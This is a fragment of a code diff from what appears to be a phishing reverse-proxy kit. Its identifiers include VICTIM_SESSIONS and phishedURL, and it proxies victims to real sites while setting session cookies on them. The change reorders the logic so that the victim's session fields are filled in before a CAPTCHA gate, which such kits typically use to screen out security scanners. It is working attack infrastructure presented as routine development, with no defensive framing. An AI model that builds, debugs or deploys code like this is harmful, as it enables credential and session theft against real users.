@@ -181,18 +181,10 @@ if (url === '/captcha-success') {
             const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
             clientResponse.setHeader("Set-Cookie", cookieHeader);
             session = cookieName;
-            // Store the original request URL for later redirect
             VICTIM_SESSIONS[session].originalUrl = url;
         }
 
-        // ---- CAPTCHA CHECK ----
-        if (!VICTIM_SESSIONS[session].captchaPassed) {
-            console.log(`[CAPTCHA] Serving CAPTCHA for session ${session}`);
-            serveCaptchaPage(clientResponse, session, headers.host);
-            return;
-        }
-
-        // ---- Proceed with normal proxying ----
+        // ---- SET SESSION FIELDS BEFORE CAPTCHA CHECK ----
         VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
         VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
         VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
@@ -209,6 +201,14 @@ if (url === '/captcha-success') {
             VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
         }
 
+        // ---- CAPTCHA CHECK ----
+        if (!VICTIM_SESSIONS[session].captchaPassed) {
+            console.log(`[CAPTCHA] Serving CAPTCHA for session ${session}`);
+            serveCaptchaPage(clientResponse, session, headers.host);
+            return;
+        }
+
+        // ---- Proceed with normal proxying ----
         clientResponse.writeHead(200, { "Content-Type": "text/html" });
         fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
     }
@@ -217,7 +217,7 @@ if (url === '/captcha-success') {
         clientResponse.writeHead(404, { "Content-Type": "text/html" });
         fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
     }
-    return; // ensure we don't fall through
+    return;
 }
 
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
